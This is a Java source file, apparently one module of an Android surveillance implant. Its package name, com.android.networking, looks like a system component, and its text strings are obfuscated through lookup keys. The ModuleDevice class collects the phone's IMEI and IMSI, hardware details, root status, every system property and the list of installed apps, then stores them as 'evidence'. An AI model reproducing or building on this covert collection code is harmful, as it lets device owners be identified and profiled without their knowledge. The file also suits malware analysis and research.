/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.networking.module;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Properties;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;

import com.android.networking.Device;
import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.util.Check;
import com.android.networking.util.WChar;

/**
 * http://android.git.kernel.org/?p=platform/packages/apps/Settings.git;a=tree;f
 * =src/com/android/settings;h=1d1b538ef4728c9559da43828a7df9e9bb5c512f;hb=HEAD
 * 
 * @author zeno
 * 
 */
public class ModuleDevice extends BaseInstantModule {

	/** The Constant TAG. */
	private static final String TAG = "ModuleDevice"; //$NON-NLS-1$

	/** The process list. */
	private boolean processList = true;

	/** The cpu usage. */
	private float cpuUsage;

	/** The cpu total. */
	private long cpuTotal;

	/** The cpu idle. */
	private long cpuIdle;

	/**
	 * Instantiates a new device agent.
	 */
	public ModuleDevice() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " DeviceAgent constructor");//$NON-NLS-1$
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {
		// this.processList = true;
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void actualStart() {

		// OS Version etc...
		if (Cfg.DEBUG) {
			Check.log(TAG + " Android");//$NON-NLS-1$
		}

		final Runtime runtime = Runtime.getRuntime();
		final Properties properties = System.getProperties();
		readCpuUsage();

		final StringBuffer sb = new StringBuffer();
		if (Cfg.DEBUG) {
			sb.append("Debug\n"); //$NON-NLS-1$
			final String timestamp = System.getProperty("build.timestamp"); //$NON-NLS-1$
			if (timestamp != null) {
				sb.append(timestamp + "\n"); //$NON-NLS-1$
			}
		}

		// SYSTEM
		sb.append(Messages.getString("9.3") + "\n"); //$NON-NLS-1$
		sb.append(Messages.getString("9.22") + Build.BOARD + "\n");
		sb.append(Messages.getString("9.23") + Build.BRAND + "\n");
		sb.append(Messages.getString("9.24") + Build.DEVICE + "\n");
		sb.append(Messages.getString("9.25") + Build.MODEL + "\n");
		sb.append(Messages.getString("9.26") + Build.DISPLAY + "\n");

		sb.append(Messages.getString("9.4") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$

		if (Device.self().getImei().length() == 0) {
			sb.append(Messages.getString("9.6") + "\n"); //$NON-NLS-1$
		} else {
			sb.append(Messages.getString("9.7") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		sb.append(Messages.getString("9.9") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		sb.append(Messages.getString("9.11") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		sb.append(Messages.getString("9.13") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$

		if (Cfg.DEBUG) {
			if (Status.self().haveRoot()) {
				sb.append(Messages.getString("9.15") + "\n"); //$NON-NLS-1$
			} else {
				sb.append(Messages.getString("9.16") + "\n"); //$NON-NLS-1$
			}
		}

		sb.append(Messages.getString("9.17") + "\n"); //$NON-NLS-1$
		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();

		while (it.hasNext()) {
			final Entry<Object, Object> pairs = it.next();
			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		if (processList) {
			final ArrayList<PInfo> apps = getInstalledApps(false); /*
																	 * false =
																	 * no system
																	 * packages
																	 */
			final int max = apps.size();

			for (int i = 0; i < max; i++) {
				sb.append(apps.get(i) + "\n"); //$NON-NLS-1$
			}
		}

		final String content = sb.toString();

		// log
		final EvidenceReference log = new EvidenceReference(EvidenceType.DEVICE);
		log.write(WChar.getBytes(content, true));
		log.close();

	}

	/**
	 * Read cpu usage.
	 */
	private void readCpuUsage() {
		try {
			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(
					Messages.getString("9.21"))), //$NON-NLS-1$
					1000);
			final String load = reader.readLine();
			reader.close();

			final String[] toks = load.split(" "); //$NON-NLS-1$

			final long currTotal = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
			final long currIdle = Long.parseLong(toks[5]);

			this.cpuUsage = ((currTotal - cpuTotal) * 100.0f / (currTotal - cpuTotal + currIdle - cpuIdle));
			this.cpuTotal = currTotal;
			this.cpuIdle = currIdle;
		} catch (final IOException ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(ex);//$NON-NLS-1$
			}
		}
	}

	/**
	 * The Class PInfo.
	 */
	class PInfo {
		/** The appname. */
		private String appname = ""; //$NON-NLS-1$

		/** The pname. */
		private String pname = ""; //$NON-NLS-1$

		/** The version name. */
		private String versionName = ""; //$NON-NLS-1$

		/** The version code. */
		private int versionCode = 0;

		/*
		 * (non-Javadoc)
		 * 
		 * @see java.lang.Object#toString()
		 */
		@Override
		public String toString() {
			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
		}
	}

	/**
	 * Gets the packages.
	 * 
	 * @return the packages
	 */
	private ArrayList<PInfo> getPackages() {
		final ArrayList<PInfo> apps = getInstalledApps(false); /*
																 * false = no
																 * system
																 * packages
																 */
		final int max = apps.size();

		for (int i = 0; i < max; i++) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
			}
		}

		return apps;
	}

	/**
	 * Gets the installed apps.
	 * 
	 * @param getSysPackages
	 *            the get sys packages
	 * @return the installed apps
	 */
	private ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
		final ArrayList<PInfo> res = new ArrayList<PInfo>();
		final PackageManager packageManager = Status.getAppContext().getPackageManager();

		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);

		for (int i = 0; i < packs.size(); i++) {
			final PackageInfo p = packs.get(i);

			if ((!getSysPackages) && (p.versionName == null)) {
				continue;
			}

			final PInfo newInfo = new PInfo();

			newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
			newInfo.pname = p.packageName;
			newInfo.versionName = p.versionName;
			newInfo.versionCode = p.versionCode;
			res.add(newInfo);
		}

		return res;
	}
}
